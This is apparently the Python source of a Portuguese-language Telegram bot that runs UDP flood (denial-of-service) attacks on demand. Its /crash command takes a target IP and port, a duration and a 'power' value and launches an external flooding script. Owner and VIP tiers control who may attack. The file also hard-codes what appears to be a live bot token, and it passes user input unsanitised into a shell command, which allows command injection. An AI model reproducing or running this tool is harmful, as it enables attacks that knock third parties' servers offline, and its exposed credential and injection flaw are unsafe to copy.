import os
import subprocess
import telebot
from threading import Thread

# Token e ID do dono
API_TOKEN = '7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8'
OWNER_ID = 6430703027

# Inicialização do bot
bot = telebot.TeleBot(API_TOKEN)

# Listas de usuários
authorized_users = [OWNER_ID]  # Usuários autorizados (incluindo o dono)
vip_users = []  # Lista de usuários VIP
vip_commands = []  # Lista de comandos restritos a VIPs

# Função para verificar se um comando é VIP
def is_vip_command(command):
    return command in vip_commands

# Verifica se o usuário é autorizado
def is_authorized(user_id):
    return user_id in authorized_users or user_id in vip_users

# Verifica se o usuário é VIP
def is_vip(user_id):
    return user_id in vip_users

# Comando /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "Bem-vindo ao bot!\n\n"
        "Comandos disponíveis:\n"
        "/crash <IP:PORT> <duração> <potência> - Envia um ataque ao IP especificado.\n"
        "/meuid - Mostra seu ID de usuário.\n\n"
        "Comandos para VIPs e dono:\n"
        "/adduser <ID> - Adiciona um usuário autorizado.\n"
        "/removeuser <ID> - Remove um usuário autorizado.\n"
        "/promovervip <ID> - Promove um usuário a VIP.\n"
        "/rebaixarvip <ID> - Remove o status de VIP de um usuário.\n\n"
        "Comandos exclusivos do dono:\n"
        "/addcomandovip <comando> - Restringe o comando para VIPs.\n"
        "/revcomandovip <comando> - Remove a restrição de comando VIP."
    )
    bot.reply_to(message, welcome_text)

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.reply_to(message, f"Seu ID de usuário é: {message.from_user.id}")

# Comando /adduser
@bot.message_handler(commands=['adduser'])
def add_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "Apenas o dono pode adicionar usuários.")
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id in authorized_users:
            bot.reply_to(message, "Este usuário já está autorizado.")
        else:
            authorized_users.append(user_id)
            bot.reply_to(message, f"Usuário {user_id} adicionado com sucesso!")
    except:
        bot.reply_to(message, "Uso correto: /adduser <ID>")

# Comando /removeuser
@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "Apenas o dono pode remover usuários.")
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id == OWNER_ID:
            bot.reply_to(message, "Você não pode remover o dono.")
        elif user_id in authorized_users:
            authorized_users.remove(user_id)
            bot.reply_to(message, f"Usuário {user_id} removido com sucesso!")
        else:
            bot.reply_to(message, "Usuário não encontrado na lista de autorizados.")
    except:
        bot.reply_to(message, "Uso correto: /removeuser <ID>")

# Comando /promovervip
@bot.message_handler(commands=['promovervip'])
def promote_to_vip(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "Apenas o dono pode promover usuários a VIP.")
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id in vip_users:
            bot.reply_to(message, "Usuário já é VIP.")
        else:
            vip_users.append(user_id)
            bot.reply_to(message, f"Usuário {user_id} promovido a VIP.")
    except:
        bot.reply_to(message, "Uso correto: /promovervip <ID>")

# Comando /rebaixarvip
@bot.message_handler(commands=['rebaixarvip'])
def demote_from_vip(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "Apenas o dono pode rebaixar VIPs.")
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id in vip_users:
            vip_users.remove(user_id)
            bot.reply_to(message, f"Usuário {user_id} não é mais VIP.")
        else:
            bot.reply_to(message, "Usuário não encontrado na lista de VIPs.")
    except:
        bot.reply_to(message, "Uso correto: /rebaixarvip <ID>")

# Comando /addcomandovip
@bot.message_handler(commands=['addcomandovip'])
def add_vip_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "Apenas o dono pode restringir comandos a VIPs.")
        return
    try:
        command = message.text.split()[1]
        if command in vip_commands:
            bot.reply_to(message, "Este comando já está restrito a VIPs.")
        else:
            vip_commands.append(command)
            bot.reply_to(message, f"O comando {command} agora é exclusivo para VIPs.")
    except:
        bot.reply_to(message, "Uso correto: /addcomandovip <comando>")

# Comando /revcomandovip
@bot.message_handler(commands=['revcomandovip'])
def remove_vip_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "Apenas o dono pode remover restrições de comandos VIP.")
        return
    try:
        command = message.text.split()[1]
        if command in vip_commands:
            vip_commands.remove(command)
            bot.reply_to(message, f"O comando {command} agora está disponível para todos.")
        else:
            bot.reply_to(message, "Este comando não está restrito a VIPs.")
    except:
        bot.reply_to(message, "Uso correto: /revcomandovip <comando>")

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if '/crash' in vip_commands and not is_vip(message.from_user.id):
        bot.reply_to(message, "Apenas VIPs podem usar este comando.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 4:
            bot.reply_to(message, "Uso correto: /crash <IP:PORT> <duração> <potência>")
            return

        ip_port = command_parts[1]
        duration = command_parts[2]
        power = command_parts[3]

        if ':' not in ip_port:
            bot.reply_to(message, "Formato inválido de IP e porta. Use o formato: IP:PORT")
            return

        # Monta o comando e executa no terminal
        command = f"python start.py UDP {ip_port} {duration} {power}"
        Thread(target=subprocess.run, args=(command,), kwargs={"shell": True}).start()

        bot.reply_to(message, f"Ataque enviado para {ip_port} por {duration} segundos com potência {power}!")
    except Exception as e:
        bot.reply_to(message, f"Ocorreu um erro: {str(e)}")

# Inicia o bot
bot.polling()